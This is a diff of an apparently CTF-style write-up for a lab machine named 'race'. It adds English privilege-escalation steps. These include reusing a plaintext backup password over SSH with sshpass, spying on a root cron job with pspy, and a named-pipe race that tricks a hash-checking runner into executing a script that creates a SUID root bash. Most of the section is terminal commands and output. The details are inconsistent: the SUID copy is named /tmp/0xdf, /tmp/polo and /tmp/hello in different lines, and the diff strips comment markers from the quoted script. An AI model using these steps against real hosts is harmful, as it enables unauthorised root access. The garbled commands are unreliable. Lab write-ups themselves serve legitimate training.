@@ -243,17 +243,66 @@ www-data@race:/home/max$ cat /usr/local/share/race-scripts/offsite-backup.sh
 #!/usr/bin/bash
 OFFSITE_HOST="offsite-backup.race.vl"
 SOURCE_DIR="/var/www/html/racers/backup/"
-# Disabled USER/PASS for security reasons. Will be provided via environment from
+Disabled USER/PASS for security reasons. Will be provided via environment from
 cron.
-# OFFSITE_USER="max"
-# OFFSITE_PASS="ruxai0GaemaS1Rah"
+OFFSITE_USER="max"
+OFFSITE_PASS="ruxai0GaemaS1Rah"
 /usr/bin/curl --insecure --connect-timeout 60 -u $OFFSITE_USER:$OFFSITE_PASS -T
 $SOURCE_DIR sftp://$OFFSITE_HOST/backups/
 </Terminal>
-## Escalade de privilèges
+We can use the password to login as Max through ssh
+<Terminal prompt="$">
+$ sshpass -p 'ruxai0GaemaS1Rah' ssh max@10.129.234.209
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)
+....SNIP.....
+Last login: Wed Sep 17 20:31:40 2025 from 10.10.14.67
+max@race:~$
+</Terminal>
+The user flag can be found under /home/max/user.txt
+<Terminal>
+max@race:~$ cat user.txt
+8477d................................
+</Terminal>
+## Privelege Escalation
+Looking through pspy from the SSH session, we have a cronjob running as root.
+Every minute, it runs offsite-backup.sh from cron via secure-cron-runner.sh:
+<Terminal prompt="$">
+max@race:~$ ./pspy64
+2025/08/29 20:26:01 CMD: UID=0     PID=15850  | /usr/sbin/CRON -f -P 
+2025/08/29 20:26:01 CMD: UID=0     PID=15853  | /usr/bin/bash /usr/local/bin/secure-cron-runner.sh 
+2025/08/29 20:26:01 CMD: UID=0     PID=15851  | /bin/sh -c /usr/local/bin/secure-cron-runner.sh >/dev/null 2>/dev/null 
+2025/08/29 20:26:01 CMD: UID=0     PID=15857  | /usr/bin/bash /usr/local/share/race-scripts/offsite-backup.sh 
+</Terminal>
+The script is simple; it contains hard-coded MD5 hashes of any script that needs to be run, which
+are checked immediately before execution. If it doesn't match, it doesn't run and instead logs the
+error
+For the exploit I'll start by making a pipe with the script name
+Then move the pipe and create a malicious  script.
+<Terminal prompt="$">
+max@race:/usr/local/share/race-scripts$ rm offsite-backup.sh 
+rm: remove write-protected regular file 'offsite-backup.sh'? y
+max@race:/usr/local/share/race-scripts$ mkfifo offsite-backup.sh
+max@race:/usr/local/share/race-scripts$ mv offsite-backup.sh pipe
+max@race:/usr/local/share/race-scripts$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 6777 /tmp/polo' | tee offsite-backup.sh
+#!/bin/bash
 
-Détails de l'escalade.
-
-## Conclusion
-
-Résumé de la chaîne d'exploitation.
+cp /bin/bash /tmp/polo
+chmod 6777 /tmp/polo
+max@race:/usr/local/share/race-scripts$ chmod +x offsite-backup.sh
+max@race:/usr/local/share/race-scripts$ cat backup/offsite-backup.sh > pipe 
+max@race:/usr/local/share/race-scripts$ ls -l /tmp/polo 
+-rwsrwsrwx 1 root root 1396520 Aug 29 20:51 /tmp/polo
+</Terminal>
+The script will verify the hash of the name
+pipes and execute the malicious offsite-backup.sh file we will have /tmp/polo SUID created.
+<Terminal prompt="$">
+max@race:~/race-scripts$ /tmp/hello -p
+polo-5.1# id
+uid=1001(max) gid=1001(max) euid=0(root) egid=0(root)
+groups=0(root),1001(max),1002(racers)
+</Terminal>
+The root flag can be found under /root/root.txt.
+<Terminal>
+polo-5.1# cat /root/root.txt
+aa2e.......................
+</Terminal>
